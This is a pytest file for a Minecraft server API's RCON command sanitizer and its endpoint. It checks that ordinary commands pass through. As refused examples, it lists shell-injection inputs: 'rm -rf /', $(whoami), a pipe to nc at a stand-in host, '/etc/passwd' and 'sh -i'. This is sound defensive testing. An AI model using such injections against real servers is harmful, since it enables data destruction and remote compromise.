"""
The command sanitizer in api/security.py, and what reaches RCON through
POST /api/server/command.

Until these tests existed the sanitizer rejected every command containing a
space, because whitespace sat in its shell-metacharacter class, and it read
"su" as a prefix, refusing "summon" and "subtitle". Only rejection paths were
tested, so the Console quietly accepted nothing but bare commands like "list".
"""

from pathlib import Path
from unittest.mock import patch

import pytest

import api.server as api_module
from api.security import sanitize_minecraft_command, sanitize_string

PROJECT_ROOT = Path(__file__).parent.parent.parent


class TestAcceptsRealCommands:
    @pytest.mark.parametrize(
        "command",
        [
            "list",
            "say hello everyone",
            "kick alice",
            "tp alice 0 64 0",
            "time set day",
            "weather clear",
            "give alice diamond 3",
            "summon cow",
            "subtitle alice",
            "gamerule keepInventory true",
            "whitelist add bob",
        ],
    )
    def test_is_accepted_unchanged(self, command):
        assert sanitize_minecraft_command(command) == (True, command, None)

    def test_a_leading_slash_is_dropped(self):
        assert sanitize_minecraft_command("/say hi") == (True, "say hi", None)


class TestRefusals:
    @pytest.mark.parametrize(
        "command",
        [
            "say hi; rm -rf /",
            "say $(whoami)",
            "say `id`",
            "list && reboot",
            "say hi | nc evil 1",
            "say hi > /tmp/x",
            "tp ../../etc",
            "say /etc/passwd",
        ],
    )
    def test_shell_and_path_tricks_are_refused(self, command):
        valid, sanitized, error = sanitize_minecraft_command(command)
        assert valid is False and sanitized is None and error

    @pytest.mark.parametrize("command", ["sudo reboot", "bash", "sh -i", "python3 x.py", "SU root"])
    def test_blocked_programs_are_refused_by_whole_word(self, command):
        assert sanitize_minecraft_command(command)[0] is False

    @pytest.mark.parametrize("command", ["", "/", "   ", "///"])
    def test_empty_commands_are_refused(self, command):
        assert sanitize_minecraft_command(command) == (False, None, "Command cannot be empty")

    def test_overlong_commands_are_refused(self):
        assert sanitize_minecraft_command("say " + "a" * 300)[0] is False


class TestSanitizeString:
    def test_strips_control_characters_and_null_bytes(self):
        assert sanitize_string("a\x00b\x07c") == "abc"

    def test_newlines_become_spaces_unless_allowed(self):
        assert sanitize_string("one\ntwo") == "one two"
        assert sanitize_string("one\ntwo", allow_newlines=True) == "one\ntwo"

    def test_truncates_and_trims(self):
        assert sanitize_string("  abcdef  ", max_length=5) == "abc"

    def test_non_strings_become_empty(self):
        assert sanitize_string(None) == ""


class TestCommandEndpoint:
    @pytest.fixture
    def admin(self, monkeypatch):
        monkeypatch.setitem(api_module.API_KEYS, "sanitizer-admin", {"name": "a", "enabled": True, "role": "admin"})
        return {"X-API-Key": "sanitizer-admin"}

    def test_a_command_with_arguments_reaches_rcon(self, admin):
        client = api_module.app.test_client()
        with patch.object(api_module, "run_rcon_command", return_value=("Said", "", 0)) as rcon:
            response = client.post("/api/server/command", headers=admin, json={"command": "say hello world"})

        assert response.status_code == 200
        rcon.assert_called_once_with("say hello world")

    def test_an_injection_attempt_never_reaches_rcon(self, admin):
        client = api_module.app.test_client()
        with patch.object(api_module, "run_rcon_command") as rcon:
            response = client.post("/api/server/command", headers=admin, json={"command": "say hi; reboot"})

        assert response.status_code == 400
        rcon.assert_not_called()
